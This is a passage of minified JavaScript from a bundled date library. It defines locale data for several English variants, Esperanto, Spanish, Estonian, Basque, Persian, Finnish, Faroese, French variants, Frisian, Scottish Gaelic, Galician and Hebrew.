            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Today at] LT",
            nextDay: "[Tomorrow at] LT",
            nextWeek: "dddd [at] LT",
            lastDay: "[Yesterday at] LT",
            lastWeek: "[Last] dddd [at] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "in %s",
            past: "%s ago",
            s: "a few seconds",
            m: "a minute",
            mm: "%d minutes",
            h: "an hour",
            hh: "%d hours",
            d: "a day",
            dd: "%d days",
            M: "a month",
            MM: "%d months",
            y: "a year",
            yy: "%d years"
        },
        ordinalParse: /\d{1,2}(st|nd|rd|th)/,
        ordinal: function(e) {
            var t = e % 10;
            return e + (1 == ~~(e % 100 / 10) ? "th" : 1 == t ? "st" : 2 == t ? "nd" : 3 == t ? "rd" : "th")
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("en-ie", {
        months: "January_February_March_April_May_June_July_August_September_October_November_December".split("_"),
        monthsShort: "Jan_Feb_Mar_Apr_May_Jun_Jul_Aug_Sep_Oct_Nov_Dec".split("_"),
        weekdays: "Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),
        weekdaysShort: "Sun_Mon_Tue_Wed_Thu_Fri_Sat".split("_"),
        weekdaysMin: "Su_Mo_Tu_We_Th_Fr_Sa".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD-MM-YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Today at] LT",
            nextDay: "[Tomorrow at] LT",
            nextWeek: "dddd [at] LT",
            lastDay: "[Yesterday at] LT",
            lastWeek: "[Last] dddd [at] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "in %s",
            past: "%s ago",
            s: "a few seconds",
            m: "a minute",
            mm: "%d minutes",
            h: "an hour",
            hh: "%d hours",
            d: "a day",
            dd: "%d days",
            M: "a month",
            MM: "%d months",
            y: "a year",
            yy: "%d years"
        },
        ordinalParse: /\d{1,2}(st|nd|rd|th)/,
        ordinal: function(e) {
            var t = e % 10;
            return e + (1 == ~~(e % 100 / 10) ? "th" : 1 == t ? "st" : 2 == t ? "nd" : 3 == t ? "rd" : "th")
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("en-nz", {
        months: "January_February_March_April_May_June_July_August_September_October_November_December".split("_"),
        monthsShort: "Jan_Feb_Mar_Apr_May_Jun_Jul_Aug_Sep_Oct_Nov_Dec".split("_"),
        weekdays: "Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),
        weekdaysShort: "Sun_Mon_Tue_Wed_Thu_Fri_Sat".split("_"),
        weekdaysMin: "Su_Mo_Tu_We_Th_Fr_Sa".split("_"),
        longDateFormat: {
            LT: "h:mm A",
            LTS: "h:mm:ss A",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY h:mm A",
            LLLL: "dddd, D MMMM YYYY h:mm A"
        },
        calendar: {
            sameDay: "[Today at] LT",
            nextDay: "[Tomorrow at] LT",
            nextWeek: "dddd [at] LT",
            lastDay: "[Yesterday at] LT",
            lastWeek: "[Last] dddd [at] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "in %s",
            past: "%s ago",
            s: "a few seconds",
            m: "a minute",
            mm: "%d minutes",
            h: "an hour",
            hh: "%d hours",
            d: "a day",
            dd: "%d days",
            M: "a month",
            MM: "%d months",
            y: "a year",
            yy: "%d years"
        },
        ordinalParse: /\d{1,2}(st|nd|rd|th)/,
        ordinal: function(e) {
            var t = e % 10;
            return e + (1 == ~~(e % 100 / 10) ? "th" : 1 == t ? "st" : 2 == t ? "nd" : 3 == t ? "rd" : "th")
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("eo", {
        months: "januaro_februaro_marto_aprilo_majo_junio_julio_aŭgusto_septembro_oktobro_novembro_decembro".split("_"),
        monthsShort: "jan_feb_mar_apr_maj_jun_jul_aŭg_sep_okt_nov_dec".split("_"),
        weekdays: "Dimanĉo_Lundo_Mardo_Merkredo_Ĵaŭdo_Vendredo_Sabato".split("_"),
        weekdaysShort: "Dim_Lun_Mard_Merk_Ĵaŭ_Ven_Sab".split("_"),
        weekdaysMin: "Di_Lu_Ma_Me_Ĵa_Ve_Sa".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "YYYY-MM-DD",
            LL: "D[-an de] MMMM, YYYY",
            LLL: "D[-an de] MMMM, YYYY HH:mm",
            LLLL: "dddd, [la] D[-an de] MMMM, YYYY HH:mm"
        },
        meridiemParse: /[ap]\.t\.m/i,
        isPM: function(e) {
            return "p" === e.charAt(0).toLowerCase()
        },
        meridiem: function(e, t, n) {
            return 11 < e ? n ? "p.t.m." : "P.T.M." : n ? "a.t.m." : "A.T.M."
        },
        calendar: {
            sameDay: "[Hodiaŭ je] LT",
            nextDay: "[Morgaŭ je] LT",
            nextWeek: "dddd [je] LT",
            lastDay: "[Hieraŭ je] LT",
            lastWeek: "[pasinta] dddd [je] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "je %s",
            past: "antaŭ %s",
            s: "sekundoj",
            m: "minuto",
            mm: "%d minutoj",
            h: "horo",
            hh: "%d horoj",
            d: "tago",
            dd: "%d tagoj",
            M: "monato",
            MM: "%d monatoj",
            y: "jaro",
            yy: "%d jaroj"
        },
        ordinalParse: /\d{1,2}a/,
        ordinal: "%da",
        week: {
            dow: 1,
            doy: 7
        }
    });
    var Wi = "ene._feb._mar._abr._may._jun._jul._ago._sep._oct._nov._dic.".split("_")
      , Ii = "ene_feb_mar_abr_may_jun_jul_ago_sep_oct_nov_dic".split("_");
    _.defineLocale("es-do", {
        months: "enero_febrero_marzo_abril_mayo_junio_julio_agosto_septiembre_octubre_noviembre_diciembre".split("_"),
        monthsShort: function(e, t) {
            return /-MMM-/.test(t) ? Ii[e.month()] : Wi[e.month()]
        },
        monthsParseExact: !0,
        weekdays: "domingo_lunes_martes_miércoles_jueves_viernes_sábado".split("_"),
        weekdaysShort: "dom._lun._mar._mié._jue._vie._sáb.".split("_"),
        weekdaysMin: "do_lu_ma_mi_ju_vi_sá".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "h:mm A",
            LTS: "h:mm:ss A",
            L: "DD/MM/YYYY",
            LL: "D [de] MMMM [de] YYYY",
            LLL: "D [de] MMMM [de] YYYY h:mm A",
            LLLL: "dddd, D [de] MMMM [de] YYYY h:mm A"
        },
        calendar: {
            sameDay: function() {
                return "[hoy a la" + (1 !== this.hours() ? "s" : "") + "] LT"
            },
            nextDay: function() {
                return "[mañana a la" + (1 !== this.hours() ? "s" : "") + "] LT"
            },
            nextWeek: function() {
                return "dddd [a la" + (1 !== this.hours() ? "s" : "") + "] LT"
            },
            lastDay: function() {
                return "[ayer a la" + (1 !== this.hours() ? "s" : "") + "] LT"
            },
            lastWeek: function() {
                return "[el] dddd [pasado a la" + (1 !== this.hours() ? "s" : "") + "] LT"
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "en %s",
            past: "hace %s",
            s: "unos segundos",
            m: "un minuto",
            mm: "%d minutos",
            h: "una hora",
            hh: "%d horas",
            d: "un día",
            dd: "%d días",
            M: "un mes",
            MM: "%d meses",
            y: "un año",
            yy: "%d años"
        },
        ordinalParse: /\d{1,2}º/,
        ordinal: "%dº",
        week: {
            dow: 1,
            doy: 4
        }
    });
    var zi = "ene._feb._mar._abr._may._jun._jul._ago._sep._oct._nov._dic.".split("_")
      , Ri = "ene_feb_mar_abr_may_jun_jul_ago_sep_oct_nov_dic".split("_");
    _.defineLocale("es", {
        months: "enero_febrero_marzo_abril_mayo_junio_julio_agosto_septiembre_octubre_noviembre_diciembre".split("_"),
        monthsShort: function(e, t) {
            return /-MMM-/.test(t) ? Ri[e.month()] : zi[e.month()]
        },
        monthsParseExact: !0,
        weekdays: "domingo_lunes_martes_miércoles_jueves_viernes_sábado".split("_"),
        weekdaysShort: "dom._lun._mar._mié._jue._vie._sáb.".split("_"),
        weekdaysMin: "do_lu_ma_mi_ju_vi_sá".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D [de] MMMM [de] YYYY",
            LLL: "D [de] MMMM [de] YYYY H:mm",
            LLLL: "dddd, D [de] MMMM [de] YYYY H:mm"
        },
        calendar: {
            sameDay: function() {
                return "[hoy a la" + (1 !== this.hours() ? "s" : "") + "] LT"
            },
            nextDay: function() {
                return "[mañana a la" + (1 !== this.hours() ? "s" : "") + "] LT"
            },
            nextWeek: function() {
                return "dddd [a la" + (1 !== this.hours() ? "s" : "") + "] LT"
            },
            lastDay: function() {
                return "[ayer a la" + (1 !== this.hours() ? "s" : "") + "] LT"
            },
            lastWeek: function() {
                return "[el] dddd [pasado a la" + (1 !== this.hours() ? "s" : "") + "] LT"
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "en %s",
            past: "hace %s",
            s: "unos segundos",
            m: "un minuto",
            mm: "%d minutos",
            h: "una hora",
            hh: "%d horas",
            d: "un día",
            dd: "%d días",
            M: "un mes",
            MM: "%d meses",
            y: "un año",
            yy: "%d años"
        },
        ordinalParse: /\d{1,2}º/,
        ordinal: "%dº",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("et", {
        months: "jaanuar_veebruar_märts_aprill_mai_juuni_juuli_august_september_oktoober_november_detsember".split("_"),
        monthsShort: "jaan_veebr_märts_apr_mai_juuni_juuli_aug_sept_okt_nov_dets".split("_"),
        weekdays: "pühapäev_esmaspäev_teisipäev_kolmapäev_neljapäev_reede_laupäev".split("_"),
        weekdaysShort: "P_E_T_K_N_R_L".split("_"),
        weekdaysMin: "P_E_T_K_N_R_L".split("_"),
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY H:mm",
            LLLL: "dddd, D. MMMM YYYY H:mm"
        },
        calendar: {
            sameDay: "[Täna,] LT",
            nextDay: "[Homme,] LT",
            nextWeek: "[Järgmine] dddd LT",
            lastDay: "[Eile,] LT",
            lastWeek: "[Eelmine] dddd LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s pärast",
            past: "%s tagasi",
            s: Qe,
            m: Qe,
            mm: Qe,
            h: Qe,
            hh: Qe,
            d: Qe,
            dd: "%d päeva",
            M: Qe,
            MM: Qe,
            y: Qe,
            yy: Qe
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("eu", {
        months: "urtarrila_otsaila_martxoa_apirila_maiatza_ekaina_uztaila_abuztua_iraila_urria_azaroa_abendua".split("_"),
        monthsShort: "urt._ots._mar._api._mai._eka._uzt._abu._ira._urr._aza._abe.".split("_"),
        monthsParseExact: !0,
        weekdays: "igandea_astelehena_asteartea_asteazkena_osteguna_ostirala_larunbata".split("_"),
        weekdaysShort: "ig._al._ar._az._og._ol._lr.".split("_"),
        weekdaysMin: "ig_al_ar_az_og_ol_lr".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "YYYY-MM-DD",
            LL: "YYYY[ko] MMMM[ren] D[a]",
            LLL: "YYYY[ko] MMMM[ren] D[a] HH:mm",
            LLLL: "dddd, YYYY[ko] MMMM[ren] D[a] HH:mm",
            l: "YYYY-M-D",
            ll: "YYYY[ko] MMM D[a]",
            lll: "YYYY[ko] MMM D[a] HH:mm",
            llll: "ddd, YYYY[ko] MMM D[a] HH:mm"
        },
        calendar: {
            sameDay: "[gaur] LT[etan]",
            nextDay: "[bihar] LT[etan]",
            nextWeek: "dddd LT[etan]",
            lastDay: "[atzo] LT[etan]",
            lastWeek: "[aurreko] dddd LT[etan]",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s barru",
            past: "duela %s",
            s: "segundo batzuk",
            m: "minutu bat",
            mm: "%d minutu",
            h: "ordu bat",
            hh: "%d ordu",
            d: "egun bat",
            dd: "%d egun",
            M: "hilabete bat",
            MM: "%d hilabete",
            y: "urte bat",
            yy: "%d urte"
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 7
        }
    });
    var $i = {
        1: "۱",
        2: "۲",
        3: "۳",
        4: "۴",
        5: "۵",
        6: "۶",
        7: "۷",
        8: "۸",
        9: "۹",
        0: "۰"
    }
      , Bi = {
        "۱": "1",
        "۲": "2",
        "۳": "3",
        "۴": "4",
        "۵": "5",
        "۶": "6",
        "۷": "7",
        "۸": "8",
        "۹": "9",
        "۰": "0"
    };
    _.defineLocale("fa", {
        months: "ژانویه_فوریه_مارس_آوریل_مه_ژوئن_ژوئیه_اوت_سپتامبر_اکتبر_نوامبر_دسامبر".split("_"),
        monthsShort: "ژانویه_فوریه_مارس_آوریل_مه_ژوئن_ژوئیه_اوت_سپتامبر_اکتبر_نوامبر_دسامبر".split("_"),
        weekdays: "یک‌شنبه_دوشنبه_سه‌شنبه_چهارشنبه_پنج‌شنبه_جمعه_شنبه".split("_"),
        weekdaysShort: "یک‌شنبه_دوشنبه_سه‌شنبه_چهارشنبه_پنج‌شنبه_جمعه_شنبه".split("_"),
        weekdaysMin: "ی_د_س_چ_پ_ج_ش".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        meridiemParse: /قبل از ظهر|بعد از ظهر/,
        isPM: function(e) {
            return /بعد از ظهر/.test(e)
        },
        meridiem: function(e, t, n) {
            return e < 12 ? "قبل از ظهر" : "بعد از ظهر"
        },
        calendar: {
            sameDay: "[امروز ساعت] LT",
            nextDay: "[فردا ساعت] LT",
            nextWeek: "dddd [ساعت] LT",
            lastDay: "[دیروز ساعت] LT",
            lastWeek: "dddd [پیش] [ساعت] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "در %s",
            past: "%s پیش",
            s: "چندین ثانیه",
            m: "یک دقیقه",
            mm: "%d دقیقه",
            h: "یک ساعت",
            hh: "%d ساعت",
            d: "یک روز",
            dd: "%d روز",
            M: "یک ماه",
            MM: "%d ماه",
            y: "یک سال",
            yy: "%d سال"
        },
        preparse: function(e) {
            return e.replace(/[۰-۹]/g, function(e) {
                return Bi[e]
            }).replace(/،/g, ",")
        },
        postformat: function(e) {
            return e.replace(/\d/g, function(e) {
                return $i[e]
            }).replace(/,/g, "،")
        },
        ordinalParse: /\d{1,2}م/,
        ordinal: "%dم",
        week: {
            dow: 6,
            doy: 12
        }
    });
    var qi = "nolla yksi kaksi kolme neljä viisi kuusi seitsemän kahdeksan yhdeksän".split(" ")
      , Ui = ["nolla", "yhden", "kahden", "kolmen", "neljän", "viiden", "kuuden", qi[7], qi[8], qi[9]];
    _.defineLocale("fi", {
        months: "tammikuu_helmikuu_maaliskuu_huhtikuu_toukokuu_kesäkuu_heinäkuu_elokuu_syyskuu_lokakuu_marraskuu_joulukuu".split("_"),
        monthsShort: "tammi_helmi_maalis_huhti_touko_kesä_heinä_elo_syys_loka_marras_joulu".split("_"),
        weekdays: "sunnuntai_maanantai_tiistai_keskiviikko_torstai_perjantai_lauantai".split("_"),
        weekdaysShort: "su_ma_ti_ke_to_pe_la".split("_"),
        weekdaysMin: "su_ma_ti_ke_to_pe_la".split("_"),
        longDateFormat: {
            LT: "HH.mm",
            LTS: "HH.mm.ss",
            L: "DD.MM.YYYY",
            LL: "Do MMMM[ta] YYYY",
            LLL: "Do MMMM[ta] YYYY, [klo] HH.mm",
            LLLL: "dddd, Do MMMM[ta] YYYY, [klo] HH.mm",
            l: "D.M.YYYY",
            ll: "Do MMM YYYY",
            lll: "Do MMM YYYY, [klo] HH.mm",
            llll: "ddd, Do MMM YYYY, [klo] HH.mm"
        },
        calendar: {
            sameDay: "[tänään] [klo] LT",
            nextDay: "[huomenna] [klo] LT",
            nextWeek: "dddd [klo] LT",
            lastDay: "[eilen] [klo] LT",
            lastWeek: "[viime] dddd[na] [klo] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s päästä",
            past: "%s sitten",
            s: Ze,
            m: Ze,
            mm: Ze,
            h: Ze,
            hh: Ze,
            d: Ze,
            dd: Ze,
            M: Ze,
            MM: Ze,
            y: Ze,
            yy: Ze
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("fo", {
        months: "januar_februar_mars_apríl_mai_juni_juli_august_september_oktober_november_desember".split("_"),
        monthsShort: "jan_feb_mar_apr_mai_jun_jul_aug_sep_okt_nov_des".split("_"),
        weekdays: "sunnudagur_mánadagur_týsdagur_mikudagur_hósdagur_fríggjadagur_leygardagur".split("_"),
        weekdaysShort: "sun_mán_týs_mik_hós_frí_ley".split("_"),
        weekdaysMin: "su_má_tý_mi_hó_fr_le".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D. MMMM, YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Í dag kl.] LT",
            nextDay: "[Í morgin kl.] LT",
            nextWeek: "dddd [kl.] LT",
            lastDay: "[Í gjár kl.] LT",
            lastWeek: "[síðstu] dddd [kl] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "um %s",
            past: "%s síðani",
            s: "fá sekund",
            m: "ein minutt",
            mm: "%d minuttir",
            h: "ein tími",
            hh: "%d tímar",
            d: "ein dagur",
            dd: "%d dagar",
            M: "ein mánaði",
            MM: "%d mánaðir",
            y: "eitt ár",
            yy: "%d ár"
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("fr-ca", {
        months: "janvier_février_mars_avril_mai_juin_juillet_août_septembre_octobre_novembre_décembre".split("_"),
        monthsShort: "janv._févr._mars_avr._mai_juin_juil._août_sept._oct._nov._déc.".split("_"),
        monthsParseExact: !0,
        weekdays: "dimanche_lundi_mardi_mercredi_jeudi_vendredi_samedi".split("_"),
        weekdaysShort: "dim._lun._mar._mer._jeu._ven._sam.".split("_"),
        weekdaysMin: "Di_Lu_Ma_Me_Je_Ve_Sa".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "YYYY-MM-DD",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Aujourd'hui à] LT",
            nextDay: "[Demain à] LT",
            nextWeek: "dddd [à] LT",
            lastDay: "[Hier à] LT",
            lastWeek: "dddd [dernier à] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "dans %s",
            past: "il y a %s",
            s: "quelques secondes",
            m: "une minute",
            mm: "%d minutes",
            h: "une heure",
            hh: "%d heures",
            d: "un jour",
            dd: "%d jours",
            M: "un mois",
            MM: "%d mois",
            y: "un an",
            yy: "%d ans"
        },
        ordinalParse: /\d{1,2}(er|e)/,
        ordinal: function(e) {
            return e + (1 === e ? "er" : "e")
        }
    }),
    _.defineLocale("fr-ch", {
        months: "janvier_février_mars_avril_mai_juin_juillet_août_septembre_octobre_novembre_décembre".split("_"),
        monthsShort: "janv._févr._mars_avr._mai_juin_juil._août_sept._oct._nov._déc.".split("_"),
        monthsParseExact: !0,
        weekdays: "dimanche_lundi_mardi_mercredi_jeudi_vendredi_samedi".split("_"),
        weekdaysShort: "dim._lun._mar._mer._jeu._ven._sam.".split("_"),
        weekdaysMin: "Di_Lu_Ma_Me_Je_Ve_Sa".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Aujourd'hui à] LT",
            nextDay: "[Demain à] LT",
            nextWeek: "dddd [à] LT",
            lastDay: "[Hier à] LT",
            lastWeek: "dddd [dernier à] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "dans %s",
            past: "il y a %s",
            s: "quelques secondes",
            m: "une minute",
            mm: "%d minutes",
            h: "une heure",
            hh: "%d heures",
            d: "un jour",
            dd: "%d jours",
            M: "un mois",
            MM: "%d mois",
            y: "un an",
            yy: "%d ans"
        },
        ordinalParse: /\d{1,2}(er|e)/,
        ordinal: function(e) {
            return e + (1 === e ? "er" : "e")
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("fr", {
        months: "janvier_février_mars_avril_mai_juin_juillet_août_septembre_octobre_novembre_décembre".split("_"),
        monthsShort: "janv._févr._mars_avr._mai_juin_juil._août_sept._oct._nov._déc.".split("_"),
        monthsParseExact: !0,
        weekdays: "dimanche_lundi_mardi_mercredi_jeudi_vendredi_samedi".split("_"),
        weekdaysShort: "dim._lun._mar._mer._jeu._ven._sam.".split("_"),
        weekdaysMin: "Di_Lu_Ma_Me_Je_Ve_Sa".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Aujourd'hui à] LT",
            nextDay: "[Demain à] LT",
            nextWeek: "dddd [à] LT",
            lastDay: "[Hier à] LT",
            lastWeek: "dddd [dernier à] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "dans %s",
            past: "il y a %s",
            s: "quelques secondes",
            m: "une minute",
            mm: "%d minutes",
            h: "une heure",
            hh: "%d heures",
            d: "un jour",
            dd: "%d jours",
            M: "un mois",
            MM: "%d mois",
            y: "un an",
            yy: "%d ans"
        },
        ordinalParse: /\d{1,2}(er|)/,
        ordinal: function(e) {
            return e + (1 === e ? "er" : "")
        },
        week: {
            dow: 1,
            doy: 4
        }
    });
    var Ji = "jan._feb._mrt._apr._mai_jun._jul._aug._sep._okt._nov._des.".split("_")
      , Vi = "jan_feb_mrt_apr_mai_jun_jul_aug_sep_okt_nov_des".split("_");
    _.defineLocale("fy", {
        months: "jannewaris_febrewaris_maart_april_maaie_juny_july_augustus_septimber_oktober_novimber_desimber".split("_"),
        monthsShort: function(e, t) {
            return /-MMM-/.test(t) ? Vi[e.month()] : Ji[e.month()]
        },
        monthsParseExact: !0,
        weekdays: "snein_moandei_tiisdei_woansdei_tongersdei_freed_sneon".split("_"),
        weekdaysShort: "si._mo._ti._wo._to._fr._so.".split("_"),
        weekdaysMin: "Si_Mo_Ti_Wo_To_Fr_So".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD-MM-YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[hjoed om] LT",
            nextDay: "[moarn om] LT",
            nextWeek: "dddd [om] LT",
            lastDay: "[juster om] LT",
            lastWeek: "[ôfrûne] dddd [om] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "oer %s",
            past: "%s lyn",
            s: "in pear sekonden",
            m: "ien minút",
            mm: "%d minuten",
            h: "ien oere",
            hh: "%d oeren",
            d: "ien dei",
            dd: "%d dagen",
            M: "ien moanne",
            MM: "%d moannen",
            y: "ien jier",
            yy: "%d jierren"
        },
        ordinalParse: /\d{1,2}(ste|de)/,
        ordinal: function(e) {
            return e + (1 === e || 8 === e || 20 <= e ? "ste" : "de")
        },
        week: {
            dow: 1,
            doy: 4
        }
    });
    _.defineLocale("gd", {
        months: ["Am Faoilleach", "An Gearran", "Am Màrt", "An Giblean", "An Cèitean", "An t-Ògmhios", "An t-Iuchar", "An Lùnastal", "An t-Sultain", "An Dàmhair", "An t-Samhain", "An Dùbhlachd"],
        monthsShort: ["Faoi", "Gear", "Màrt", "Gibl", "Cèit", "Ògmh", "Iuch", "Lùn", "Sult", "Dàmh", "Samh", "Dùbh"],
        monthsParseExact: !0,
        weekdays: ["Didòmhnaich", "Diluain", "Dimàirt", "Diciadain", "Diardaoin", "Dihaoine", "Disathairne"],
        weekdaysShort: ["Did", "Dil", "Dim", "Dic", "Dia", "Dih", "Dis"],
        weekdaysMin: ["Dò", "Lu", "Mà", "Ci", "Ar", "Ha", "Sa"],
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[An-diugh aig] LT",
            nextDay: "[A-màireach aig] LT",
            nextWeek: "dddd [aig] LT",
            lastDay: "[An-dè aig] LT",
            lastWeek: "dddd [seo chaidh] [aig] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "ann an %s",
            past: "bho chionn %s",
            s: "beagan diogan",
            m: "mionaid",
            mm: "%d mionaidean",
            h: "uair",
            hh: "%d uairean",
            d: "latha",
            dd: "%d latha",
            M: "mìos",
            MM: "%d mìosan",
            y: "bliadhna",
            yy: "%d bliadhna"
        },
        ordinalParse: /\d{1,2}(d|na|mh)/,
        ordinal: function(e) {
            return e + (1 === e ? "d" : e % 10 == 2 ? "na" : "mh")
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("gl", {
        months: "xaneiro_febreiro_marzo_abril_maio_xuño_xullo_agosto_setembro_outubro_novembro_decembro".split("_"),
        monthsShort: "xan._feb._mar._abr._mai._xuñ._xul._ago._set._out._nov._dec.".split("_"),
        monthsParseExact: !0,
        weekdays: "domingo_luns_martes_mércores_xoves_venres_sábado".split("_"),
        weekdaysShort: "dom._lun._mar._mér._xov._ven._sáb.".split("_"),
        weekdaysMin: "do_lu_ma_mé_xo_ve_sá".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D [de] MMMM [de] YYYY",
            LLL: "D [de] MMMM [de] YYYY H:mm",
            LLLL: "dddd, D [de] MMMM [de] YYYY H:mm"
        },
        calendar: {
            sameDay: function() {
                return "[hoxe " + (1 !== this.hours() ? "ás" : "á") + "] LT"
            },
            nextDay: function() {
                return "[mañá " + (1 !== this.hours() ? "ás" : "á") + "] LT"
            },
            nextWeek: function() {
                return "dddd [" + (1 !== this.hours() ? "ás" : "a") + "] LT"
            },
            lastDay: function() {
                return "[onte " + (1 !== this.hours() ? "á" : "a") + "] LT"
            },
            lastWeek: function() {
                return "[o] dddd [pasado " + (1 !== this.hours() ? "ás" : "a") + "] LT"
            },
            sameElse: "L"
        },
        relativeTime: {
            future: function(e) {
                return 0 === e.indexOf("un") ? "n" + e : "en " + e
            },
            past: "hai %s",
            s: "uns segundos",
            m: "un minuto",
            mm: "%d minutos",
            h: "unha hora",
            hh: "%d horas",
            d: "un día",
            dd: "%d días",
            M: "un mes",
            MM: "%d meses",
            y: "un ano",
            yy: "%d anos"
        },
        ordinalParse: /\d{1,2}º/,
        ordinal: "%dº",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("he", {
        months: "ינואר_פברואר_מרץ_אפריל_מאי_יוני_יולי_אוגוסט_ספטמבר_אוקטובר_נובמבר_דצמבר".split("_"),
        monthsShort: "ינו׳_פבר׳_מרץ_אפר׳_מאי_יוני_יולי_אוג׳_ספט׳_אוק׳_נוב׳_דצמ׳".split("_"),
        weekdays: "ראשון_שני_שלישי_רביעי_חמישי_שישי_שבת".split("_"),
        weekdaysShort: "א׳_ב׳_ג׳_ד׳_ה׳_ו׳_ש׳".split("_"),
        weekdaysMin: "א_ב_ג_ד_ה_ו_ש".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D [ב]MMMM YYYY",
            LLL: "D [ב]MMMM YYYY HH:mm",
            LLLL: "dddd, D [ב]MMMM YYYY HH:mm",
            l: "D/M/YYYY",
            ll: "D MMM YYYY",
            lll: "D MMM YYYY HH:mm",
            llll: "ddd, D MMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[היום ב־]LT",
            nextDay: "[מחר ב־]LT",
            nextWeek: "dddd [בשעה] LT",
            lastDay: "[אתמול ב־]LT",
            lastWeek: "[ביום] dddd [האחרון בשעה] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "בעוד %s",
            past: "לפני %s",
            s: "מספר שניות",
            m: "דקה",
            mm: "%d דקות",
            h: "שעה",
            hh: function(e) {
                return 2 === e ? "שעתיים" : e + " שעות"
            },
            d: "יום",
            dd: function(e) {
                return 2 === e ? "יומיים" : e + " ימים"
            },
            M: "חודש",
            MM: function(e) {
                return 2 === e ? "חודשיים" : e + " חודשים"
            },
            y: "שנה",
            yy: function(e) {
                return 2 === e ? "שנתיים" : e % 10 == 0 && 10 !== e ? e + " שנה" : e + " שנים"
            }
        },
